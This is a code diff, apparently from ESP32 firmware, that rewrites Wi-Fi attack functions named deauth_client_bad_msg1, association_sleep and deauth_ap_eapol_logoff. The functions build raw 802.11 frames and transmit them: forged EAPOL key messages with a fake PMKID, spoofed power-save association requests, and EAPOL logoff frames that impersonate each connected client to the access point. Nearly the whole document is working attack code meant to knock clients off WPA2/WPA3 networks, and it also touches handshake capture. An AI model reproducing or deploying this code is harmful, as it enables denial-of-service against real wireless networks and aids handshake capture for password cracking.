@@ -202,7 +202,6 @@ IRAM_ATTR static void promiscuous_callback(void *buf, wifi_promiscuous_pkt_type_
                 handshake_info.eapol_len = len;
                 handshake_info.handshake_captured = true;
                 ESP_LOGI(TAG, "Got Handshake!");
-                print_handshake(&handshake_info);
             }
         }
         
@@ -430,14 +429,17 @@ void wifi_attack_deauth_client_bad_msg1(void)
         return;
     }
 
-    static uint64_t replay_counter = 2000;
+    static uint64_t replay_counter = 0;
+    uint8_t frame_size = 153; // Size of the EAPOL frame
+
     uint8_t eapol_packet_bad_msg1[153] = {
-        0x08, 0x02,                         // Frame Control (EAPOL)
-        0x3A, 0x01,                         // Duration
+        0x08, 0x02,//0x02,                         // Frame Control (EAPOL)
+        0x00, 0x00,                         // Duration
         0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // Destination (Broadcast)
         0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Source (BSSID)
         0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // BSSID
-        0x00, 0x00,                         // Sequence Control
+        0x30, 0x00,                         // Sequence Control
+        //0x05, 0x00,                         // QoS‑Control
         /* LLC / SNAP */
         0xaa, 0xaa, 0x03, 0x00, 0x00, 0x00,
         0x88, 0x8e,                          // Ethertype = EAPOL
@@ -469,12 +471,13 @@ void wifi_attack_deauth_client_bad_msg1(void)
         /* Key Data Len (2) */ 
         0x00, 0x16,
         /* Key Data (22 B) */
-        0xDD, 0x16,                // Vendor‑specific (PMKID IE)
+        0xDD, 0x14,//0x14,                // Vendor‑specific (PMKID IE)
         0x00, 0x0F, 0xAC, 0x04,      // OUI + Type (PMKID)
         /* PMKID (16 byte zero) */
-        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
-        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
+        0x11, 0x22, 0x33, 0x44, 0x55, 0x66, 0x77, 0x88, 
+        0x99, 0xaa, 0xbb, 0xcc, 0xdd, 0xee, 0xff, 0x11
     };
+
     memcpy(&eapol_packet_bad_msg1[10], target_local.bssid, 6);    // Source Address
     memcpy(&eapol_packet_bad_msg1[16], target_local.bssid, 6);    // BSSID
 
@@ -488,28 +491,61 @@ void wifi_attack_deauth_client_bad_msg1(void)
     }
 
     /* Set WPA/WPA2 or WPA3 */
-    if(target_local.authmode == WIFI_AUTH_WPA2_PSK || target_local.authmode == WIFI_AUTH_WPA2_ENTERPRISE) 
+    if(target_local.authmode == WIFI_AUTH_WPA3_PSK || target_local.authmode == WIFI_AUTH_WPA3_ENTERPRISE || target_local.authmode == WIFI_AUTH_WAPI_PSK || target_local.authmode == WIFI_AUTH_WPA2_WPA3_PSK) 
     {
-        eapol_packet_bad_msg1[38] = 0xCA;      // Key‑Info (LSB)  Install|Ack|Pairwise, ver=3
-        eapol_packet_bad_msg1[39] = 0x00;      // Key Length MSB
-        eapol_packet_bad_msg1[40] = 0x10;      // Key Length LSB   (must be 0 with GCMP)
-    }
-    else if(target_local.authmode == WIFI_AUTH_WPA3_PSK || target_local.authmode == WIFI_AUTH_WPA3_ENTERPRISE || target_local.authmode == WIFI_AUTH_WAPI_PSK || target_local.authmode == WIFI_AUTH_WPA2_WPA3_PSK) 
-    {
-        eapol_packet_bad_msg1[38] = 0xCB;      // Key‑Info (LSB)  Install|Ack|Pairwise, ver=3
-        eapol_packet_bad_msg1[39] = 0x00;      // Key Length MSB
-        eapol_packet_bad_msg1[40] = 0x00;      // Key Length LSB   (must be 0 with GCMP)
+        eapol_packet_bad_msg1[35] = 0x5f;      // Length 95 Bytes
+        eapol_packet_bad_msg1[38] = 0xcb;//0x8a;//0xCB;      // Key‑Info (LSB)  Install|Ack|Pairwise, ver=3
+        eapol_packet_bad_msg1[130] = 0x00; // Key Data Length (LSB) 22 Bytes
+        frame_size = frame_size - 22; // Adjust frame size for WPA3
     }
 
     /* Skip broadcast address */
     for (uint8_t i = 1; i < num_clients; i++) 
     {
         memcpy(&eapol_packet_bad_msg1[4], clients[i].mac, 6); // Destination Address (Client MAC)
-        esp_wifi_80211_tx(WIFI_IF_STA, eapol_packet_bad_msg1, sizeof(eapol_packet_bad_msg1), false);
-        
-        /* Increase replay counter for next packet */
-        replay_counter++;
+        esp_wifi_80211_tx(WIFI_IF_STA, eapol_packet_bad_msg1, frame_size, false);
     }
+    /* Increase replay counter for next packet */
+    replay_counter++;
+
+    xSemaphoreGive(clients_semaphore);
+}
+
+
+void wifi_attack_association_sleep(void)
+{
+    /* Get a copy of target */
+    target_info_t target_local = { 0 };
+    if( get_target_info_copy(&target_local, &target) == false )
+    {
+        return;
+    }
+    /* Check client array access */
+    if (xSemaphoreTake(clients_semaphore, pdMS_TO_TICKS(CLIENT_SEM_WAIT)) != pdTRUE) 
+    {
+        return;
+    }
+
+    uint8_t assoc_packet[30] = {
+        0x00, 0x10, // Frame Control (Association Request) PM=1
+        0x00, 0x00, // Duration
+        0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // Destination (Broadcast)
+        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Source (Fake Source or BSSID)
+        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // BSSID
+        0x00, 0x00,                         // Sequence Control
+        0x01,                               // Category Code (Association Request)
+        0x01                                // Status Code (Success)
+    };
+    memcpy(&assoc_packet[10], target_local.bssid, 6);    // Source Address
+    memcpy(&assoc_packet[16], target_local.bssid, 6);    // BSSID
+
+    /* Skip broadcast address */
+    for (uint8_t i = 1; i < num_clients; i++) 
+    {
+        memcpy(&assoc_packet[4], clients[i].mac, 6); // Destination Address (Client MAC)
+        esp_wifi_80211_tx(WIFI_IF_STA, assoc_packet, sizeof(assoc_packet), false);
+    }
+    
     xSemaphoreGive(clients_semaphore);
 }
 
@@ -528,24 +564,27 @@ void wifi_attack_deauth_ap_eapol_logoff(void)
         return;
     }
 
-    uint8_t eapol_logoff_packet[33] = {
-        0x08, 0x02, // Frame Control (EAPOL)
+    uint8_t eapol_logoff_packet[38] = {
+        0x88, 0x11, // Frame Control (EAPOL)
         0x00, 0x00, // Duration
         0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // Destination (Broadcast)
         0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Source (Fake Source or BSSID)
         0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // BSSID
         0x00, 0x00,                         // Sequence Control
+        0x05, 0x00,                         // QoS‑Control
         0xAA, 0xAA, 0x03, 0x00, 0x00, 0x00, // LLC Header
         0x88, 0x8E,                         // EAPOL Ethertype
-        0x02                                // EAPOL-Type (Logoff)
+        0x02,                               // EAP Version
+        0x02,                               // EAPOL-Type (Logoff)
+        0x00, 0x00                          // EAPOL Length
     };
-    memcpy(&eapol_logoff_packet[10], target_local.bssid, 6);    // Source Address
+    memcpy(&eapol_logoff_packet[4], target_local.bssid, 6); // Destination Address (AP)
     memcpy(&eapol_logoff_packet[16], target_local.bssid, 6);    // BSSID
-
+    
     /* Skip broadcast address */
     for (uint8_t i = 1; i < num_clients; i++) 
     {
-        memcpy(&eapol_logoff_packet[4], clients[i].mac, 6); // Destination Address (Client MAC)
+        memcpy(&eapol_logoff_packet[10], clients[i].mac, 6);    // Source Address
         esp_wifi_80211_tx(WIFI_IF_STA, eapol_logoff_packet, sizeof(eapol_logoff_packet), false);
     }
     xSemaphoreGive(clients_semaphore);
